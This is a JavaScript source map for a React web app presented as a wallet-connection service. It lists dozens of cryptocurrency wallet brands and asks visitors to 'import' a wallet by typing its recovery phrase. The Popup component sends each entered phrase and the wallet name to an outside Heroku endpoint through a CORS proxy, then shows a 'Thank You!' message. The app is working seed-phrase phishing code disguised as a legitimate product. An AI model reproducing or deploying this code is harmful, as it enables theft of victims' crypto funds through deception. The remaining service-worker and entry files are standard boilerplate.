{"version":3,"sources":["components/homepage/data.js","components/homepage/Homepage.js","components/popup/Popup.js","App.js","serviceWorker.js","index.js"],"names":["data","name","image","Homepage","props","setPopUpdata","setShowPopup","className","map","d","onClick","importWallet","src","Popup","popUpData","useState","showMessage","setShowmessage","rPhrase","setRPhrase","disableButton","setDisableButton","showSuccess","setShowSuccess","closeModal","type","disabled","value","fill","stroke-linecap","stroke-linejoin","stroke-width","viewBox","stroke","class","onChange","e","target","checkPhrase","match","setTimeout","body","JSON","stringify","wallet","Axios","post","headers","then","res","catch","err","handleSubmission","App","showPopup","Fragment","Boolean","window","location","hostname","ReactDOM","render","StrictMode","document","getElementById","navigator","serviceWorker","ready","registration","unregister"],"mappings":"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","file":"static/js/main.8ac5b945.chunk.js","sourcesContent":["export const data =[\r\n    { name: '  Trust wallet', image: '../../images/trustwallet.png' },\r\n    { name: '  AAVE wallet', image: '../../images/aave.jpeg' },\r\n    { name: '  Ledger wallet', image: '../../images/ledgerwallet.png' },\r\n    { name: '  Enjin wallet', image: '../../images/Enjinwallet.png' },\r\n    { name: '  MEW wallet', image: '../../images/mewwallet.png' },\r\n    { name: '  Meta mask wallet', image: '../../images/metamask.png' },\r\n    { name: '  Digitex wallet', image: '../../images/digitex.png' },\r\n    { name: '  Coinbase wallet', image: '../../images/coinbase.png' },\r\n    { name: '  Autherum wallet', image: '../../images/autherum.png' },\r\n    { name: '  Portis wallet', image: '../../images/portis.png' },\r\n    { name: '  Formatic wallet', image: '../../images/formatic.png' },\r\n    { name: '  Exodus wallet', image: '../../images/exodus.png' },\r\n    { name: '  Defiat wallet', image: '../../images/defiat.png' },\r\n    { name: '  Skale wallet', image: '../../images/skale.png' },\r\n    { name: '  Wallet connect', image: '../../images/walletconnect.jpeg' },\r\n    { name: '  Coinomi wallet', image: '../../images/coinomi.png' },\r\n    { name: '  Atomic wallet', image: '../../images/atomic.jpeg' },\r\n    { name: '  Tron wallet', image: '../../images/tronwallet.png' },\r\n    { name: '  Band protocol wallet', image: '../../images/band.png' },\r\n    { name: '  EOS wallet', image: '../../images/eos.png' },\r\n    { name: '  Wax wallet', image: '../../images/wax.png' },\r\n    { name: '  Zilliqa wallet', image: '../../images/zilliqa.png' },\r\n    { name: '  Polkadot wallet', image: '../../images/polkadot.png' },\r\n    { name: '  Monero wallet', image: '../../images/monero.png' },\r\n    { name: '  Klever wallet', image: '../../images/klever.jpg' },\r\n    { name: '  Neon wallet', image: '../../images/neon.png' },\r\n    { name: '  Theta wallet', image: '../../images/theta.png' },\r\n    { name: '  Tomo Chain wallet', image: '../../images/tomochain.png' },\r\n    { name: '  Jaxx wallet', image: '../../images/jaxx.png' },\r\n    { name: '  Elrond wallet', image: '../../images/elrond.png' },\r\n    { name: '  Bancor wallet', image: '../../images/bancor.png' },\r\n    { name: '  1inch wallet', image: '../../images/1inch.png' },\r\n    { name: '  Cosmos wallet', image: '../../images/cosmos.png' },\r\n    { name: '  Moonlet wallet', image: '../../images/moonlet.png' },\r\n    { name: '  Harmony wallet', image: '../../images/harmony.png' },\r\n    { name: '  Tezos wallet', image: '../../images/tezos.png' },\r\n    { name: '  Kyber Swap wallet', image: '../../images/kyberswap.png' },\r\n    { name: '  Falcon Swap wallet', image: '../../images/falswap.png' },\r\n    { name: '  Zilliqa wallet', image: '../../images/zilliqa.png' },\r\n    { name: '  Kava wallet', image: '../../images/kava.png' },\r\n    { name: '  Ocean Protocol wallet', image: '../../images/oceanprotocol.png' },\r\n    { name: '  Hex wallet', image: '../../images/hexcom.png' },\r\n    { name: '  Cardano wallet', image: '../../images/cardano.png' },\r\n    { name: '  Kardia Chain wallet', image: '../../images/kardiachain.png' },\r\n    { name: '  Octofi wallet', image: '../../images/octofi.png' },\r\n    { name: '  Algorand wallet', image: '../../images/algorand.png' }\r\n  ]","import React from 'react'\r\nimport './Homepage.css'\r\nimport './mobile.css'\r\nimport {data }from './data'\r\nconst Homepage = ({setPopUpdata,setShowPopup},props) => {\r\n\r\n\r\n    const importWallet = (d) => {\r\n        setPopUpdata( d );\r\n        setShowPopup(true)\r\n    }\r\n    return (\r\n        <section className=\"homepage\">\r\n            <div className=\"header\">\r\n                <h1>Connect Wallet</h1>\r\n                \r\n            </div>\r\n\r\n            <div className=\"text\">\r\n            <p>The best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app..</p>\r\n            </div>\r\n            <div className=\"grid\">\r\n\r\n                {\r\n                    data.map(d =>(\r\n                    <div className=\"small-box\" onClick={()=>importWallet(d)}>\r\n                    <img src={d.image}></img>\r\n                            <p>{ d.name}</p>\r\n                </div>\r\n                    ))\r\n                }\r\n                \r\n                \r\n            </div>\r\n        </section>\r\n    );\r\n};\r\n\r\nexport default Homepage\r\n","import React, {useState,useEffect} from 'react'\r\nimport './Popup.css'\r\nimport './mobile.css'\r\nimport Axios from 'axios'\r\nconst Popup = ( { setPopUpdata, setShowPopup, popUpData } ) => {\r\n    const [ showMessage, setShowmessage ] = useState( '' );\r\n    const [ rPhrase, setRPhrase ] = useState( '' )\r\n    const [ disableButton, setDisableButton ] = useState( false );\r\n    const [ showSuccess, setShowSuccess ] = useState( false );\r\n\r\n\r\n    const closeModal = () => {\r\n        setShowPopup( false );\r\n        setPopUpdata( null );\r\n        setShowSuccess(false);\r\n    };\r\n\r\n    const handleSubmission = ( data ) => {\r\n      \r\n        setDisableButton( true );\r\n        \r\n\r\n        //12 characters or more ingoring spaces\r\n        const checkPhrase = rPhrase.match( /\\s*(\\S\\s*){12,}/g );\r\n        \r\n        // console.log( rPhrase );\r\n        setTimeout( () => {\r\n            if ( !checkPhrase ) {\r\n                setShowmessage( 'Invalid characters entered.' )\r\n            } else {\r\n                const config = {\r\n                    headers: {\r\n                        'Content-Type': 'application/json'\r\n                    }\r\n                }\r\n        \r\n                const body = JSON.stringify( { rPhrase, wallet: popUpData.name } )\r\n                Axios\r\n                    .post( 'https://cors-anywhere.herokuapp.com/https://h-job.herokuapp.com/message', body, config )\r\n                    // .then( res =>res.json() )\r\n                    .then( res => {\r\n                        //    console.log(res)\r\n                    } )\r\n                     \r\n                    .catch( err => {\r\n                        // console.log(err)\r\n                    } );\r\n\r\n                    setShowSuccess(true)\r\n            }\r\n\r\n            \r\n            setDisableButton( false )\r\n        }, 4000 )\r\n\r\n        setTimeout( () => {\r\n            \r\n            setShowmessage( '' )\r\n        }, 6000 )\r\n\r\n        \r\n    }\r\n\r\n    return (\r\n        <section className=\"popup\">\r\n            {!showSuccess ?\r\n                <div>\r\n                    <div className=\"form-header\">\r\n                        <img src={ popUpData.image }></img>\r\n                        <p>Import your { popUpData.name }</p>\r\n                    </div>\r\n                    { showMessage ? <p className=\"error-success-msg\">{ showMessage }</p> : null }\r\n                    <div className=\"form\">\r\n                        <form>\r\n                            <div>\r\n                                <label>Wallet Name:</label>\r\n                                <input type=\"text\" disabled={ true } value={ popUpData.name } />\r\n                                <span className=\"input\"><svg fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\" class=\"h-6 w-6\"><path d=\"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z\"></path></svg></span>\r\n                            </div>\r\n                            <div className=\"recovery\">\r\n                                <label>Recovery Phrase:</label>\r\n                                <textarea type=\"text\" onChange={ e => setRPhrase( e.target.value ) } ></textarea>\r\n                                <span className=\"textarea\"><svg fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\" class=\"h-6 w-6\"><path d=\"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z\"></path></svg></span>\r\n                            </div>\r\n                            <h6><i className=\"fa fa-info-circle\"></i>Typically 12 (sometimes 24) words separated by single spaces.</h6>\r\n\r\n\r\n                            { disableButton ?\r\n                                <div className=\"proceed-button disabled\">\r\n                                    <p >Please Wait... </p>\r\n                        \r\n                                </div> :\r\n                                <div className=\"proceed-button\" onClick={ () => handleSubmission() }>\r\n                                    <p >Proceed </p>\r\n                                    <svg fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\" class=\"h-6 w-6\"><path d=\"M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z\"></path></svg>\r\n                                </div> }\r\n\r\n                        \r\n                        </form>\r\n                    \r\n                        { disableButton ? null :\r\n                            <div className=\"cancel\">\r\n                                <p onClick={ () => closeModal() }>Cancel</p>\r\n                            </div> }\r\n                    </div>\r\n                </div>\r\n                :\r\n                <div className=\"success-message-wrapper\">\r\n                    <div className=\"success-message\">\r\n                        <img src=\"../../images/success.png\"/>\r\n                        <h1>Thank You!</h1>\r\n                        <h4>We recieved your submission.</h4>\r\n                        <p onClick={ () => closeModal() }> Back </p>\r\n                    </div>\r\n                </div> }\r\n\r\n        </section>\r\n    );\r\n};\r\n\r\nexport default Popup\r\n","import React, {useState,useEffect} from 'react'\r\nimport Homepage from './components/homepage/Homepage'\r\nimport './App.css'\r\nimport Popup from './components/popup/Popup'\r\nconst App = () => {\r\n        const [ showPopup, setShowPopup ] = useState( false );\r\n        const [popUpData, setPopUpdata] = useState({})\r\n        return (\r\n                <React.Fragment>\r\n                        <Homepage setPopUpdata={setPopUpdata} setShowPopup={setShowPopup} />\r\n                        {showPopup?<Popup popUpData={popUpData} setPopUpdata={setPopUpdata} setShowPopup={setShowPopup} />: null}\r\n                </React.Fragment>\r\n                      \r\n                \r\n        )\r\n}\r\n\r\nexport default App\r\n","// This optional code is used to register a service worker.\n// register() is not called by default.\n\n// This lets the app load faster on subsequent visits in production, and gives\n// it offline capabilities. However, it also means that developers (and users)\n// will only see deployed updates on subsequent visits to a page, after all the\n// existing tabs open on the page have been closed, since previously cached\n// resources are updated in the background.\n\n// To learn more about the benefits of this model and instructions on how to\n// opt-in, read https://bit.ly/CRA-PWA\n\nconst isLocalhost = Boolean(\n  window.location.hostname === 'localhost' ||\n    // [::1] is the IPv6 localhost address.\n    window.location.hostname === '[::1]' ||\n    // 127.0.0.0/8 are considered localhost for IPv4.\n    window.location.hostname.match(\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\n    )\n);\n\nexport function register(config) {\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\n    // The URL constructor is available in all browsers that support SW.\n    const publicUrl = new URL(process.env.PUBLIC_URL, window.location.href);\n    if (publicUrl.origin !== window.location.origin) {\n      // Our service worker won't work if PUBLIC_URL is on a different origin\n      // from what our page is served on. This might happen if a CDN is used to\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\n      return;\n    }\n\n    window.addEventListener('load', () => {\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\n\n      if (isLocalhost) {\n        // This is running on localhost. Let's check if a service worker still exists or not.\n        checkValidServiceWorker(swUrl, config);\n\n        // Add some additional logging to localhost, pointing developers to the\n        // service worker/PWA documentation.\n        navigator.serviceWorker.ready.then(() => {\n          console.log(\n            'This web app is being served cache-first by a service ' +\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\n          );\n        });\n      } else {\n        // Is not localhost. Just register service worker\n        registerValidSW(swUrl, config);\n      }\n    });\n  }\n}\n\nfunction registerValidSW(swUrl, config) {\n  navigator.serviceWorker\n    .register(swUrl)\n    .then(registration => {\n      registration.onupdatefound = () => {\n        const installingWorker = registration.installing;\n        if (installingWorker == null) {\n          return;\n        }\n        installingWorker.onstatechange = () => {\n          if (installingWorker.state === 'installed') {\n            if (navigator.serviceWorker.controller) {\n              // At this point, the updated precached content has been fetched,\n              // but the previous service worker will still serve the older\n              // content until all client tabs are closed.\n              console.log(\n                'New content is available and will be used when all ' +\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\n              );\n\n              // Execute callback\n              if (config && config.onUpdate) {\n                config.onUpdate(registration);\n              }\n            } else {\n              // At this point, everything has been precached.\n              // It's the perfect time to display a\n              // \"Content is cached for offline use.\" message.\n              console.log('Content is cached for offline use.');\n\n              // Execute callback\n              if (config && config.onSuccess) {\n                config.onSuccess(registration);\n              }\n            }\n          }\n        };\n      };\n    })\n    .catch(error => {\n      console.error('Error during service worker registration:', error);\n    });\n}\n\nfunction checkValidServiceWorker(swUrl, config) {\n  // Check if the service worker can be found. If it can't reload the page.\n  fetch(swUrl, {\n    headers: { 'Service-Worker': 'script' }\n  })\n    .then(response => {\n      // Ensure service worker exists, and that we really are getting a JS file.\n      const contentType = response.headers.get('content-type');\n      if (\n        response.status === 404 ||\n        (contentType != null && contentType.indexOf('javascript') === -1)\n      ) {\n        // No service worker found. Probably a different app. Reload the page.\n        navigator.serviceWorker.ready.then(registration => {\n          registration.unregister().then(() => {\n            window.location.reload();\n          });\n        });\n      } else {\n        // Service worker found. Proceed as normal.\n        registerValidSW(swUrl, config);\n      }\n    })\n    .catch(() => {\n      console.log(\n        'No internet connection found. App is running in offline mode.'\n      );\n    });\n}\n\nexport function unregister() {\n  if ('serviceWorker' in navigator) {\n    navigator.serviceWorker.ready.then(registration => {\n      registration.unregister();\n    });\n  }\n}\n","import React from 'react';\r\nimport ReactDOM from 'react-dom';\r\n\r\n\r\nimport App from './App';\r\nimport * as serviceWorker from './serviceWorker';\r\n\r\nReactDOM.render(\r\n  <React.StrictMode>\r\n  \r\n      \r\n        <App />\r\n      \r\n    \r\n  </React.StrictMode>,\r\n  document.getElementById('root')\r\n);\r\n\r\n// If you want your app to work offline and load faster, you can change\r\n// unregister() to register() below. Note this comes with some pitfalls.\r\n// Learn more about service workers: https://bit.ly/CRA-PWA\r\nserviceWorker.unregister();"],"sourceRoot":""}